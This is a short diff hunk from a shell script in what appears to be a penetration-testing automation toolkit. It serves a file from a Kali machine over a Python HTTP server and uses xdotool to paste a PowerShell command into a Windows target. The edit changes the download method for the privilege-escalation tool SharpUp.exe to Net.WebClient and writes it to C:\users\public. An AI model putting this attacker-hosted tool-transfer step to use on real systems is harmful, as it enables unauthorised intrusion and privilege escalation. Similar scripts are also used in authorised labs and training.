@@ -11,7 +11,7 @@ cd ~/Desktop/base/code/xdotool/scripts/windows/permissions/.files
 python3 -m http.server 1337 &
 HTTP_PID=$!
 
-paste_command "Invoke-WebRequest 'http://${KALI_IP}:1337/SharpUp.exe' -OutFile 'SharpUp.exe'"
+paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:1337/SharpUp.exe', 'C:\users\public\SharpUp.exe')"
 xdotool key Return
 sleep 3
 
